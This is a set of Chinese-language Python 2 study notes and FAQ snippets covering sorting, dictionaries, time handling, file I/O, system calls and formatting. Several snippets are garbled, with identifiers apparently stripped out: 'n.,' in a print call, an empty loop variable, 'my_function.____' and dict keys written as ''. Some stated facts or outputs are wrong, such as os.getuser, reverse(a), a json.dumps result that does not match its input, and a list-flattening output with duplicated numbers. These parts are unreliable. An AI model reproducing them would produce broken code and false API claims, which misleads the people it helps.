		if q.find(".xlsx")&q.find(".xls")!=-1:
			file_dir_path = os.path.join(x,q)
			#print("遍历得到的execl路径名:",file_dir_path)
			fileList.append(file_dir_path)

writefile=open(path+"\\本目录下测试用例case名字汇总.txt",'w')
print("############开始处理每个文件中的sheet###########")
for x in fileList:
	file1=xlrd.open_workbook(x)
	print("开始获取用例名:",x)
	writefile.write('以下用例位于:' + x + '\n')
	for n in file1.sheets():
		#print(n.col_values(4))
		try:
			index=n.row_values(0).index('Testcase_Number')
			for y in n.col_values(index):
				if y != "" and y !="Testcase_Number":
					writefile.write(y.rstrip()+'\n')
		except ValueError:
			print(x,n.,"中有错误的格式,跳过处理本页!")
		except IndexError:
			print(x,n.,"中有空白页,跳过处理本页!")
writefile.close()
}
3、列表按列排序(list sort){
#sort()：只能对list进行排序；在原list上进行排序。
 L.sort(cmp=None, key=None, reverse=False),配需成功,返回None
cmp：对比函数
key：用于获取排序的关键字
reverse：True -- 降序  False -- 升序

#sorted()：对所有的序列进行排序,包括：string、list、tuple和dictory；sorted生成1个新序列,同时保持原序列不变。
 sorted(iterable, cmp=None, key=None, reverse=False),排序成功,返回1个排序后的新列表
cmp：对比函数
key：用于获取排序的关键字
reverse：True -- 降序  False -- 升序

如果列表的每个元素都是一个元组(tuple),我们要根据元组的某列来排序的化,可参考如下方法
下面例子我们是根据元组的第2列和第3列数据来排序的,而且是倒序(reverse=True)
>>> a = [('2011-03-17', '2.26', 6429600, '0.0'), ('2011-03-16', '2.26', 12036900, '-3.0'),
 ('2011-03-15', '2.33', 15615500,'-19.1')]
>>> print a[0][0]
2011-03-17
>>> b = sorted(a, key=lambda result: result[1],reverse=True)
>>> print b
[('2011-03-15', '2.33', 15615500, '-19.1'), ('2011-03-17', '2.26', 6429600, '0.0'),
('2011-03-16', '2.26', 12036900, '-3.0')]
>>> c = sorted(a, key=lambda result: result[2],reverse=True)
>>> print c
[('2011-03-15', '2.33', 15615500, '-19.1'), ('2011-03-16', '2.26', 12036900, '-3.0'),
('2011-03-17', '2.26', 6429600, '0.0')]
}
4、列表去重(list uniq){
有时候需要将list中重复的元素删除,就要使用如下方法
>>> lst= [(1,'sss'),(2,'fsdf'),(1,'sss'),(3,'fd')]
>>> set(lst)
set([(2, 'fsdf'), (3, 'fd'), (1, 'sss')])
>>>
>>> lst = [1, 1, 3, 4, 4, 5, 6, 7, 6]
>>> set(lst)
set([1, 3, 4, 5, 6, 7])
}
5、字典排序(dict sort){
一般来说,我们都是根据字典的key来进行排序,但是我们如果想根据字典的value值来排序,就使用如下方法
>>> from operator import itemgetter
>>> aa = {"a":"1","sss":"2","ffdf":'5',"ffff2":'3'}
>>> sort_aa = sorted(aa.items(),key=itemgetter(1))
>>> sort_aa
[('a', '1'), ('sss', '2'), ('ffff2', '3'), ('ffdf', '5')]
>>> sort_aa=sorted(aa.items(),key=itemgetter(0))
>>> sort_aa
[('a', '1'), ('ffdf', '5'), ('ffff2', '3'), ('sss', '2')]
与下面是一样的道理,转化成元组在通过序号 排序
dic = {"a1":1, "c3":2, "b2":3}
sorted(dic.iteritems()) -->[('a1', 1), ('b2', 3), ('c3', 2)]
sorted(dic.iteritems(), key=lambda x : x[1]) --> [('a1', 1), ('c3', 2), ('b2', 3)]
对字典按键排序,用元组 列表的形式返回
>>> sorted(d.items, key=lambda d:d[0])
[('no', 2), ('ok', 1)]
对字典按值排序,用元组列表的形式返回
>>> sorted(d.items, key=lambda d:d[1])
[('ok', 1), ('no', 2)]
从上面的运行结果看到,按照字典的value值进行排序的
对于dictionnary,需知道以下几点注意事项：
a、 dictionary 的 key 是大小写敏感的；
b、 一个dictionary中不能有重复的 key；
c、 dictionary是无序的,没有元素顺序的概念,它们只是序偶的简单排列。
2、 字典排序实现：
参见cookbook,Recipe 5.1. Sorting a Dictionary讲述了字典排序的方法；
前面已说明dictionary本身没有顺序概念,但是总是在某些时候,但是我们常常需要对字典进行排序,怎么做呢？下面告诉你：
方法1：最简单的方法,排列元素(key/value对),然后挑出值。字典的items方法,会返回一个元组的列表,其中每个元组都包含一对项目——键与对应的值。此时排序可以sort()方法。
def sortedDictValues1(adict):
    items = adict.items()
    items.sort()
    return [value for key, value in items]
方法2：使用排列键(key)的方式,挑出值,速度比方法1快。字典对象的keys()方法返回字典中所有键值组成的列表,次序是随机的。需要排序时只要对返回的键值列表使用sort()方法。
def sortedDictValues1(adict):
    keys = adict.keys()
    keys.sort()
    return [adict[key] for key in keys]
方法3：通过映射的方法去更有效的执行最后一步
def sortedDictValues1(adict):
    keys = adict.keys()
    keys.sort()
    return map(adict.get,keys)
方法4：对字典按键排序,用元组列表的形式返回,同时使用lambda函数来进行；
sorted(iterable[, cmp[, key[, reverse]]]
cmp和key一般使用lambda
如：
  >>> d={"ok":1,"no":2}
  对字典按键排序,用元组列表的形式返回
  >>> sorted(d.items, key=lambda d:d[0])
  [('no', 2), ('ok', 1)]
  对字典按值排序,用元组列表的形式返回
  >>> sorted(d.items, key=lambda d:d[1])
  [('ok', 1), ('no', 2)]
}
6、字典,列表,字符串互转{
以下是生成数据库连接字符串,从字典转换到字符串
>>> params = {"server":"mpilgrim", "database":"master", "uid":"sa", "pwd":"secret"}
>>> ["%s=%s" % (k, v) for k, v in params.items()] #####6666
['server=mpilgrim', 'uid=sa', 'database=master', 'pwd=secret']
>>> ";".join(["%s=%s" % (k, v) for k, v in params.items()])
'server=mpilgrim;uid=sa;database=master;pwd=secret'
下面的例子 是将字符串转化为字典
>>> a = 'server=mpilgrim;uid=sa;database=master;pwd=secret'
>>> aa = {}
>>> for i in a.split(';'):aa[i.split('=',1)[0]] = i.split('=',1)[1]
   
>>> aa
{'pwd': 'secret', 'database': 'master', 'uid': 'sa', 'server': 'mpilgrim'}
}
7、时间对象操作{
将时间对象转换成字符串
>>> import datetime
>>> datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
  '2011-01-20 14:05'

时间大小比较
>>> import time
>>> t1 = time.strptime('2011-01-20 14:05',"%Y-%m-%d %H:%M")
>>> t2 = time.strptime('2011-01-20 16:05',"%Y-%m-%d %H:%M")
>>> t1 > t2
  False
>>> t1 < t2
  True

时间差值计算,计算8小时前的时间
>>> datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
  '2011-01-20 15:02'
>>> (datetime.datetime.now() - datetime.timedelta(hours=8)).strftime("%Y-%m-%d %H:%M")
  '2011-01-20 07:03'

将字符串转换成时间对象
>>> endtime=datetime.datetime.strptime('20100701',"%Y%m%d")
>>> type(endtime)
  <type 'datetime.datetime'>
>>> print endtime
  2010-07-01 00:00:00

将从 1970-01-01 00:00:00 UTC 到现在的秒数,格式化输出
>>> import time
>>> a = 1302153828
>>> time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(a))
  '2011-04-07 13:23:48'
  }
8、去除空格{
　　strip()
"   xyz   ".strip()            # returns "xyz"
"   xyz   ".lstrip()           # returns "xyz   "
"   xyz   ".rstrip()           # returns "   xyz"
"  x y z  ".replace(' ', '')   # returns "xyz"
}
9、print 格式化输出{
1.格式化输出字符串
截取字符串输出,下面例子将只输出字符串的前3个字母
>>> str="abcdefg"
>>> print "%.3s" % str
  abc
按固定宽度输出,不足使用空格补全,下面例子输出宽度为10
>>> str="abcdefg"
>>> print "%10s" % str
     abcdefg
2.截取字符串,按照固定宽度输出
>>> str="abcdefg"
>>> print "%10.3s" % str
         abc
3.浮点类型数据位数保留
>>> import fpformat
>>> a= 0.0030000000005
>>> b=fpformat.fix(a,6)
>>> print b
  0.003000
4.对浮点数四舍五入,主要使用到round函数
>>> from decimal import *
>>> a ="2.26"
>>> b ="2.29"
>>> c = Decimal(a) - Decimal(b)
>>> print c
  -0.03
>>> c / Decimal(a) * 100
  Decimal('-1.327433628318584070796460177')
>>> Decimal(str(round(c / Decimal(a) * 100, 2)))
  Decimal('-1.33')
5.进制转换
有些时候需要作不同进制转换,可以参考下面的例子(%x 十六进制,%d 十进制,%o 八进制)
>>> num = 10
>>> print "Hex = %x,Dec = %d,Oct = %o" %(num,num,num)
  Hex = a,Dec = 10,Oct = 12
  }
10、Python调用系统命令或者脚本{
使用 os.system() 调用系统命令 , 程序中无法获得到输出和返回值
>>> import os
>>> os.system('ls -l /proc/cpuinfo')
>>> os.system("ls -l /proc/cpuinfo")
  -r--r--r-- 1 root root 0  3月 29 16:53 /proc/cpuinfo
  0

使用 os.popen() 调用系统命令, 程序中可以获得命令输出,但是不能得到执行的返回值
>>> out = os.popen("ls -l /proc/cpuinfo")
>>> print out.read()
  -r--r--r-- 1 root root 0  3月 29 16:59 /proc/cpuinfo

使用 commands.getstatusoutput() 调用系统命令, 程序中可以获得命令输出和执行的返回值
>>> import commands
>>> commands.getstatusoutput('ls /bin/ls')
  (0, '/bin/ls')
 }
11、Python 捕获用户 Ctrl+C ,Ctrl+D 事件{
有些时候,需要在程序中捕获用户键盘事件,比如ctrl+c退出,这样可以更好的安全退出程序
try:
    do_some_func()
except KeyboardInterrupt:
    print "User Press Ctrl+C,Exit"
except EOFError:
    print "User Press Ctrl+D,Exit"
	}
12、Python 读写文件{
一次性读入文件到列表,速度较快,适用文件比较小的情况下
track_file = "track_stock.conf"
fd = open(track_file)
content_list = fd.readlines()
fd.close()
for line in content_list:
    print line

逐行读入,速度较慢,适用没有足够内存读取整个文件(文件太大)
fd = open(file_path)
fd.seek(0)
title = fd.readline()
keyword = fd.readline()
uuid = fd.readline()
fd.close()

写文件 write 与 writelines 的区别
Fd.write(str) : 把str写到文件中,write()并不会在str后加上一个换行符
Fd.writelines(content) : 把content的内容全部写到文件中,原样写入,不会在每行后面加上任何东西

执行python代码：
exec(open('test2.py').read())
}
13、python字符串/元组/列表/字典互转{
#-*-coding:utf-8-*- 

#1、字典
dict = {'name': 'Zara', 'age': 7, 'class': 'First'}

#字典转为字符串，返回：<type 'str'> {'age': 7, 'name': 'Zara', 'class': 'First'}
print type(str(dict)), str(dict)

#字典可以转为元组，返回：('age', 'name', 'class')
print tuple(dict)
#字典可以转为元组，返回：(7, 'Zara', 'First')
print tuple(dict.values())

#字典转为列表，返回：['age', 'name', 'class']
print list(dict)
#字典转为列表
print dict.values

#2、元组
tup=(1, 2, 3, 4, 5)

#元组转为字符串，返回：(1, 2, 3, 4, 5)
print tup.__str__()

#元组转为列表，返回：[1, 2, 3, 4, 5]
print list(tup)

#元组不可以转为字典

#3、列表
nums=[1, 3, 5, 7, 8, 13, 20];

#列表转为字符串，返回：[1, 3, 5, 7, 8, 13, 20]
print str(nums)

#列表转为元组，返回：(1, 3, 5, 7, 8, 13, 20)
print tuple(nums)

#列表不可以转为字典

#4、字符串

#字符串转为元组，返回：(1, 2, 3)
print tuple(eval("(1,2,3)"))
#字符串转为列表，返回：[1, 2, 3]
print list(eval("(1,2,3)"))
#字符串转为字典，返回：<type 'dict'>
print type(eval("{'name':'ljq', 'age':24}"))
}
}

#python常见问题,这部分很杂乱涉及到了python2
{
1、python的帮助： help(str)  可以查看str字符类的帮助信息。
2、python没有括号来表明语句块,而是采用缩进来表示这一语法。
3、一定要用自然字符串处理正则表达式。否则会需要使用很多的反斜杠。例如,后向引用符可以写成'\\1'或r'\1'。
4、for循环的区间是半开区间：range(1,5,2)给出[1,3]。记住,range 向上延伸到第二个数,即它不包含第二个数。
5、print语句的结尾使用了一个 逗号 来消除每个print语句自动打印的换行符。
6、列表的sort方法来对列表排序。需要理解的是,这个方法影响列表本身,而不是返回一个修改后的列表——这与字符串工作的方法不同。
   这就是我们所说的列表是 可变的 而字符串是 不可变的 。
7、因为从文件读到的内容已经以换行符结尾,所以我们在print语句上使用逗号来消除自动换行。最后,我们用close关闭这个文件。
8、安全使用  and-or  技巧: (1 and [a] or [b] )[0]
   由于 [a] 是一个非空列表,所以它决不会为假。即使 a 是 0 或者 '' 或者其它假值,列表 [a] 也为真,因为它有一个元素。
   在 Python 语言的某些情况下 if 语句是不允许使用的,比如在 lambda 函数中。
9、从notepad++执行python代码：cmd /k python "$(FULL_CURRENT_PATH)" & PAUSE & EXIT  然后 run -> run设置快捷键
10、python 3 开始默认utf-8的编码模式,因此在2.x版本下要注意字符编码的问题：
     #!/usr/bin/python
      #coding:utf-8           #如果出现编码问题,需在开头加上这句
     movies=[]
      print('movies List的长度是：'+str(len(movies)))      #注意不像java隐式类型转换,要str显示转换类型
11、转置一个元组：
      a = (1,2,3,4,5)
      b = list(a)[::-1]
      print b   #[5, 4, 3, 2, 1]
      或者直接调用revered函数：
     >>> a = (1,2,3,4,5)
      >>> aa=tuple(reverse(a))
      >>> print (aa)
      (5, 4, 3, 2, 1)
12、*和**作为参数列表的区别：
     不定长参数 *para,**para
     *para 表示接受一个元组
     **para 表示接受一个字典
     *para要在**para之前
13、三元表达式推荐写法：foo = val1 if condition else val2
14、为啥[""]为真而("")为假呢
    那是因为 ("") 是空的字符串,而不是元组对象。 而前者则是一个 list 对象。
15、python的颜色设置：在linux上可以
     def inred( s ):
          return "%s[31;2m%s%s[0m"%(chr(27), s, chr(27))
      print 'this is a very '+inred('important')+' thing'
16、有人知道以lambda作为参数的函数应该怎么写？可以用lambda作回调处理的
     def test(a,b):
      return a(b)
      test(lambda a:a+1, 1)
      是这种还是在test里返回函数？
     那直接用函数做参数行吗？
     当然可以
     不用把java的思维带进来,python里函数也是可传递的
17、#json.dumps在默认情况下,对于非ascii字符生成的是相对应的字符编码,而非原始字符,例如：
      >>> import json
      >>> js = json.loads('{"haha": "哈哈"}')
      >>> print json.dumps(js)
      {"haha": "\u54c8\u54c8"}
      解决办法很简单:
      >>> print json.dumps(js, ensure_ascii=False)
      {"haha": "哈哈"}
18、关于python打印乱码的问题： #3.0中已不存在
     (1)、print list 出现：a1\xc7\xc9\xba\xc3\xd3\xc3\xb5\xc4\xd2\xf4\xc1\xbf\xbf\xd8\xd6
     (2)、print str 正常
     原因：
     在执行 print 时,如果是一个字符串,就直接输出。如果是其它的对象,python会调用这个对象的 __str__ 或 __repr__
      来进行处理,对象list本身不是一个字符串,你要打印它,python会自动调用 repr(list) 来处理,这样就生成 list
      所表示的字符串,然后打印出来了。所以你看到的是 list 的字符串表示。其中的字符串都转为 \x这种内码表示形式了。
     例如：
     >>> a={}
      >>> a["abc"]="中国"
      >>> print a
      {'abc': '\xe4\xb8\xad\xe5\x9b\xbd'}
      >>> print a["abc"]
      中国
     >>>
      (3)、print会解释内嵌换行符,以友好显示 (P198)
     >>>bytes = open('datafile.txt').read()
      >>>bytes
      "apam\n43\n"
      >>>print bytes
      apam
      43
      因此,我们不得不使用其他转换工具,把文本文件中的字符串转换成真正的python对象。鉴于python不会自动把字符串转
     换为数字或其他对象类型,如果我们需要使用诸如索引、加法等普通对象工具,就得这么做。
     f = open('datafile.txt')
      line = f.readline()
      line
      'spam\n'
      line.rstrip()   #也可 line[:-1] ,但只有确定所有行都含有 "\n" 的时候才行(文件中最后一行有时会没有)
     'spam'
19、判断模块是否已安装
     模块加载后,会储存在sys.modules这个字典里,只需要在这个字典里查找,即可判断是否已安装。print sys.modules
20.python命令行求和：
      python -c "print reduce(lambda x,y:x+y,range(1,101))"
      python -c "print map(sum,zip([1],[2]))"
      python -c "print sum(range(101))"
21.python 简单模拟清屏方法：
     print ">>>\n"*40
22.python的高精度浮点运算：
      >>> from __future__ import division
      >>> print "%.2f" %(1/3)
      0.33
23.2.7版本以上直接设置千分位分隔符
     format(1234567890,',')
24.通过join来连接字符串：
      [ 1 ,   2 ,   3 ]
      >>> s = ['a', 'b', 'c', 'd']
      >>> print " ".join(s)
      a b c d
      >>> print "-".join(s)
      a-b-c-d                                #可以设置分隔符
     >>>
      a = 'hello'
      b = 'python'
      c = 1
      print '%s %s %s %s' % (a, b, c, s)   #连接多个变量
25.python计时：python -mtimeit -s'l=[[1,2,3],[4,5,6], [7], [8,9]]*99' 'reduce(lambda x,y: x+y,l)'
26.python取前两天的日期
      >>> from datetime import timedelta, date
      >>> print date.today() + timedelta(days = -2)
      2011-10-09
      >>>
27.python 中元素是否设置：isset(var) #不知道还能不能用
28.Python统计列表中元素出现的次数
     Python列表可以进行简单的统计,比如list的函数count()可以直接统计元素出现的次数。 set  #去重
     mylist = [2,2,2,2,2,2,3,3,3,3]
      myset = set(mylist)
      for item in myset:
          print mylist.count(item), " of ", item, " in list"
29.一个空 list 本身等同于 False
30.遍历 list 的同时获取索引: #enumerate
      for i, element in enumerate(mylist):
          pass
31.python全局替换：
      a="\t\t\t123\t456"
      print a
      print ",".join(a.split("\t"))
      或者
      re.sub
      或者 print a.replace("\t",",")
32.minidom的值：text、data、nodeValue
33.python的几大应用场景：系统维护,测试,web原型开发
34.如何让 json 以 gbk 编码：
     按照JSON标准,中文首先被转换成unicode,然后转换成\uxxxx的格式。
     json采用gbk编码：
     a = {'key':'中文'}
      print json.dumps(a, ensure_ascii=True, encoding='gbk')
35.python的双重for循环：
      >>> a = ('la','luo','lao')
      >>> b =('hua','huo')
      >>> print [(x,y) for x in a for y in b]
      [('la', 'hua'), ('la', 'huo'), ('luo', 'hua'), ('luo', 'huo'), ('lao', 'hua'), ('lao', 'huo')]
      >>> print zip(a,b)
      [('la', 'hua'), ('luo', 'huo')]
      >>>
36.python颜色输出：
      WHITE = '\033[97m'
      CYAN = '\033[96m'
      BLUE = '\033[94m'
      GREEN = '\033[92m'
      YELLOW = '\033[93m'
      RED = '\033[91m'
      ENDC = '\033[0m'
      print (GREEN + '    [>80]:' + BLUE + ' #%d(%d)' + WHITE + ':%s') % (i, len(line), line) + ENDC
37.python自带的简单的 http 服务器：
     python -m SimpleHTTPServer
38.python命令行将ascii转换成十六进制：
     python -c 'print "hello".encode("hex")'
39.python 中双斜杠代表单斜杠：python解析一次,正则解析一次：
     >>> r"123\\\121\3".replace("\\\\","\\")
      '123\\\\121\\3'                                # 注意 命令行 会对其做一次转义,以便可以还原
     >>> print r"123\\\121\3".replace("\\\\","\\")
      123\\121\3                                    # print 就会显示最终的效果
     >>>
40.python 行列倒序输出：类似    |rev|tac
      >>> print '''1 2
          3 4
          5 6
          7 8'''[::-1]
      8 7
      6 5
      4 3
      2 1
      >>>
41.python 自动关闭文件句柄：
     在python 2.5之后 由于有了context manager, 就可以使用with语法, 在with语句结束时, 有系统来保证自动关闭文件句柄.
      with open("Output.txt", "w") as text_file:
          text_file.write("Purchase Amount: %s"%TotalAmount)
42.python对字符的转义：
     echo 'a\\\b'|python -c 'import sys;a=sys.stdin.readlines();print a;'
      ['a\\\\\\b\n']
      echo 'a\\\b'|python -c 'import sys;a=sys.stdin.readlines();print a[0].replace("\\\\","-")'
      a-\b
43.遍历当前文件夹获取顶级文件夹：
     [ os.path.join(os.getcwd(), ) for  in os.listdir(os.getcwd()) if os.path.isdir()]
44.python产生空洞文件：
    bigFile= open(_file_, 'w')
    bigFile.seek(1024*1024*1024* fileSize-1) #大小自己定,需要几个G, fileSize就是几,速度绝对快
    bigFile.write('\x00')
    bigFile.close()
45.json美化输出：
     chrome插件JSONView 或者 tool模块：echo '{"a": 1, "b": 2}' | python -m json.tool
      echo '{"a": 1, "b": 2}'|python -c 'import json,sys;print json.dumps(json.loads(sys.stdin.readlines()[0].strip()), indent=4)'
46.python字典 dict 默认是无序的,要有序请用collection中的orderdict：
      >>> d=collections.OrderedDict()
      >>> d['c']=1
      >>> d['d']=2
      >>> d['b']=4
      >>> d
      OrderedDict([('c', 1), ('d', 2), ('b', 4)])
      #当往前台传递时
     >>> json.dumps(d)
      '{"c": 1, "d": 3, "b": 2}'
47.lamada的妙用：将下划线的字符串处理为Camel的表示形式：
     re.sub('^\w|_\w', lambda x:x.group()[-1].upper(), 'blog_view') 输出 'BlogView'。
48.getattr利用变量构造引用类属性：
     property in ['','age','sex']:
      print getattr(user,property)
49.标准的JSON是使用双引号的,javascript支持使用单引号格式的json文本,而python的json库只支持双引号,
     如果有单引号的,需要 replace("'",'"') 全部替换成双引号,否则会报错
50.用 minidom 格式化输出 xml：
     python -c 'import xml.dom.minidom;print xml.dom.minidom.parseString("<Root><Head><a>20130221144501</a><b>1</b></Head><Records><c>1</c><d><e><f></f><g>20121022103334</g></e></d></Records></Root>").toprettyxml()'
51.使用 itertools 模块进行排列组合：
     python -c "from itertools import permutations;print [''.join(i) for i in list(permutations(['a','b','c']))]"
      print([''.join(x) for x in itertools.product('ATCG', repeat=4)])
52.解码16进制字符串：也可以直接 print 出来
     >>> b='\xd1\xee\xba\xea\xc1\xc1\n'
      >>> print unicode(b, 'gbk').encode('utf8')
53.python 中的正则 split：
     print re.compile(r"a{1,2}").split('baac')
      >>> re.split('\W+', 'Words, words, words.')
      ['Words', 'words', 'words', '']
      >>> re.split('(\W+)', 'Words, words, words.')
      ['Words', ', ', 'words', ', ', 'words', '.', '']
      >>> re.split('\W+', 'Words, words, words.', 1)
      ['Words', 'words, words.']
      >>> re.split('[a-f]+', '0a3B9', flags=re.IGNORECASE)
      ['0', '3', '9']
      >>> re.split('(\W+)', '   words, words   ')
      ['', '   ', 'words', ', ', 'words', '   ', '']
54.python标准输出无缓存：
     export PYTHONUNBUFFERED=1     # python -u cmd
55.如何在循环中获取下标
      >>> seasons = ['Spring', 'Summer', 'Fall', 'Winter']
      >>> list(enumerate(seasons))
      [(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')]
      >>> list(enumerate(seasons, start=1))
      [(1, 'Spring'), (2, 'Summer'), (3, 'Fall'), (4, 'Winter')]
56.foo is None 和 foo == None的区别：
     is是身份测试,==是值相等测试
     (ob1 is ob2) 等价于 (id(ob1) == id(ob2))
57.为何1 in [1,0] == True执行结果是False
      这里python使用了比较运算符链,类似 a < b < c 会被转为 (a < b) and (b < c) # b不会被解析两次
58.Python中的switch替代语法：
     python中没有switch,有什么推荐的处理方法么？使用字典:
      def f(x):
          return {
              'a': 1,
              'b': 2,
          }.get(x, 9)

59.字符串转为float/int：
     a = "545.2222"; int(float(a)) 或者 ast.literal_eval("545.2222")
60.如何随机生成大写字母和数字组成的字符串
     ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(N))
61.python中字符串的contains
     if not "blah" in somestring: continue        # 可读性、可维护性差,不推荐！
     if "blah" not in somestring: continue
62.如何判断一个字符串是数字
     a.isdigit()        # 缺点,对非整数无能为力,float(s) 或 正则
63.将一个字符串转为一个字典
     从python2.6开始,你可以使用内建模块 ast.literal_eval,这个做法比直接eval更安全
     ast.literal_eval("{'muffin' : 'lolz', 'foo' : 'kitty'}")
64.#如何获取一个字符的ASCII码
      >>> ord('a')
	   97
      >>> chr(97)
      'a'
      >>> chr(ord('a') + 3)
      'd'
      >>>
      #另外对于unicode
      >>> unichr(97)
      u'a'
      >>> unichr(1234)
      u'\u04d2'
65.如何填充 0 到数字字符串中保证统一长度
      print n.zfill(3)
      print '%03d' % n
      print "{0:03d}".format(4)
66.如何创建不存在的目录结构
     if not os.path.exists(directory):
          os.makedirs(directory)
      需要注意的是,当目录在exists和makedirs两个函数调用之间被创建时,makedirs将抛出OSError
67.#如何拷贝一个文件
     shutil.copyfile(src, dst)
      将src文件内容拷贝到dst,目标文件夹必须可写,否则将抛出IOError异常,如果目标文件已存在,将被覆盖
     另外特殊文件,比如字符文件,块设备文件,无法用这个方法进行拷贝
68.#逐行读文件去除换行符(perl chomp line)
      #比较pythonic的做法: "line 1\nline 2\r\nline 3\nline 4".splitlines()
69.如何获取一个文件的创建和修改时间
      print "last modified: %s" % time.ctime(os.path.getmtime(file))
      print "created: %s" % time.ctime(os.path.getctime(file))
      (mode, ino, dev, nlink, uid, gid, size, atime, mtime, ctime) = os.stat(file)
      print "last modified: %s" % time.ctime(mtime)
70.如何将字符串转换为datetime
      可以查看下time模块的strptime方法,反向操作是strftime
      date_object = datetime.strptime('Jun 1 2005  1:33PM', '%b %d %Y %I:%M%p')
71.如何找到一个目录下所有.txt文件
      os.chdir("/mydir")
      for files in glob.glob("*.txt"):
          print files

      os.chdir("/mydir")
      for files in os.listdir("."):
          if files.endswith(".txt"):
              print files

      for r,d,f in os.walk("/mydir"):
          for files in f:
              if files.endswith(".txt"):
                  print os.path.join(r,files)
72.读文件到列表中
      f = open('file')
      lines = f.readlines()
      f.close()
      等价
     with open(f) as f:
          content = f.readlines()
      往文件中追加文本
     with open("test.txt", "a") as myfile:
          myfile.write("appended text")
73.如何列出一个目录的所有文件
     onlyfiles = [ f for f in listdir(mypath) if isfile(join(mypath,f)) ]
      f = []
      for (dirpath, dirs, files) in walk(mypath):
          f.extend(files)
          break
      print glob.glob("/home/adam/*.txt")
74.如何从标准输入读取内容stdin
      for line in fileinput.input(): pass
75.在Python中如何展示二进制字面值
     十六进制可以

      >>> 0x12AF
      4783
      >>> 0x100
      256
      八进制可以

      >>> 01267
      695
      >>> 0100
      64
      二进制如何表示？
     Python 2.5 及更早版本: 可以表示为 int('01010101111',2) 但没有字面量
     Python 2.6 beta: 可以使用0b1100111 or 0B1100111 表示
     Python 2.6 beta: 也可以使用 0o27 or 0O27 (第二字字符是字母 O)
     Python 3.0 beta: 同2.6,但不支持027这种语法
76.如何将一个十六进制字符串转为整数
     >>> int("a", 16)
      10
      >>> int("0xa",16)
      10
77.如何强制使用浮点数除法
     from __future__ import division；c = a / b
      或者转换,如果除数或被除数是浮点数,那么结果也是浮点数
     c = a / float(b)
78.如何合并两个列表
     1.不考虑顺序：listone + listtwo    #linstone.extend(listtwo)也行,就是会修改listone
      2.考虑顺序做些处理： itertools.chain(listone, listtwo)
79.#如何随机地从列表中抽取变量
     print random.choice(['a', 'b', 'c', 'd', 'e'])
80.获取列表的最后一个元素
     result = l[-1]
      result = l.pop()
81.如何将一个列表切分成若干个长度相同的子序列
     想要得到这样的效果
     l = range(1, 1000)
      print chunks(l, 10) -> [ [ 1..10 ], [ 11..20 ], .., [ 991..999 ] ]
      使用yield:
      def chunks(l, n):
          """ Yield successive n-sized chunks from l.
          """
          for i in xrange(0, len(l), n):
              yield l[i:i+n]
      list(chunks(range(10, 75), 10))
      直接处理
     def chunks(l, n):
          return [l[i:i+n] for i in range(0, len(l), n)]
82.如何获取list中包含某个元素所在的下标
     ["foo","bar","baz"].index('bar')
83.如何扁平一个二维数组
      l = [[1,2,3],[4,5,6], [7], [8,9]]
      变为[1, 2, 3, 4, 5, 6, 4, 5, 6, 7, 8, 9]
	  b=[]
	  for x in l:
			b=b+x
      列表解析
     [item for sublist in l for item in sublist]
      itertools
      >>> import itertools
      >>> list2d = [[1,2,3],[4,5,6], [7], [8,9]]
      >>> merged = list(itertools.chain(*list2d))
      # python >= 2.6
      >>> import itertools
      >>> list2d = [[1,2,3],[4,5,6], [7], [8,9]]
      >>> merged = list(itertools.chain.from_iterable(list2d))
      sum
      sum(l, [])
84.使用列表解析创建一个字典
      python 2.6
      d = dict((key, value) for (key, value) in sequence)
      python 2.7+ or 3, 使用 字典解析语法
      d = {key: value for (key, value) in sequence}
85.如何在单一表达式中合并两个Python字典
     >>> x = {'a':1, 'b': 2}
      >>> y = {'b':10, 'c': 11}
      >>> z = x.update(y)
      print x
      我想要最终合并结果在z中,不是x,我要怎么做？
     这种情况下,可以使用
     z = dict(x.items() + y.items())
      这个表达式将会实现你想要的,最终结果z,并且相同key的值,将会是y中key对应的值
     >>> x = {'a':1, 'b': 2}
      >>> y = {'b':10, 'c': 11}
      >>> z = dict(x.items() + y.items())
      >>> z
      {'a': 1, 'c': 11, 'b': 10}
      如果在Python3中,会变得有些复杂
     >>> z = dict(list(x.items()) + list(y.items()))
      >>> z
      {'a': 1, 'c': 11, 'b': 10}
86.排序一个列表中的所有dict,根据dict内值
     如何排序如下列表,根据或age
      [{'':'Homer', 'age':39}, {'':'Bart', 'age':10}]
      简单的做法
     newlist = sorted(list_to_be_sorted, key=lambda k: k[''])
      高效的做法
     from operator import itemgetter
      newlist = sorted(list_to_be_sorted, key=itemgetter(''))
87.如何获取一个函数的函数名字符串
     my_function.____
      >>> import time
      >>> time.time.____
      'time'
88.用函数名字符串调用一个函数
     假设模块foo有函数bar:
      import foo
      methodToCall = getattr(foo, 'bar')
      result = methodToCall()
      或者一行搞定
     result = getattr(foo, 'bar')()
89.检查是否是str或者str的子类
     isinstance(o, str)
      注意,你或许想要的是
     isinstance(o, basestring)
      因为unicode字符串可以满足判定(unicode 不是str的子类,但是str和unicode都是basestring的子类)
      可选的,isinstance可以接收多个类型参数,只要满足其中一个即True
      isinstance(o, (str, unicode))
      判断变量的类型可以使用 type
90.json和simplejson的区别
     json就是simple,加入到标准库. json在2.6加入,simplejson在2.4+,2.6+,更有优势
     另外,simplejson更新频率更高,如果你想使用最新版本,建议用simplejson
      好的做法是
     try:
          import simplejson as json
      except ImportError:
          import json
91.有什么方法可以获取系统当前用户名么?
      os.getuser()、os.getuid()、getpass.getuser()
92.Python中有没有简单优雅的方式定义单例类
     我不认为有必要,一个拥有函数的模块(不是类)可以作为很好的单例使用,它的所有变量被绑定到这个模块,无论如何都不能被重复实例化
     如果你确实想用一个类来实现,在python中不能创建私有类或私有构造函数,所以你不能隔离多个实例而仅仅通过自己的API来访问属性
     我还是认为将函数放入模块,并将其作为一个单例来使用是最好的办法
     顺带说下 staticmethod,静态方法在调用时,对类及实例一无所知
     仅仅是获取传递过来的参数,没有隐含的第一个参数,在Python里基本上用处不大,你完全可以用一个模块函数替换它
93.如何获取Python的site-packages目录位置
     python -c "from distutils.sysconfig import get_python_lib; print(get_python_lib())"
94.如何获取安装的python模块列表
     >>> help('modules')
95.什么是迭代？
     任何你可用 "for    in   " 处理的都是可迭代对象：列表,字符串,文件   . 这些迭代对象非常便捷,因为你可以尽可能多地获取你想要的东西
     但当你有大量数据并把所有值放到内存时,这种处理方式可能不总是你想要的
96.什么是生成器？
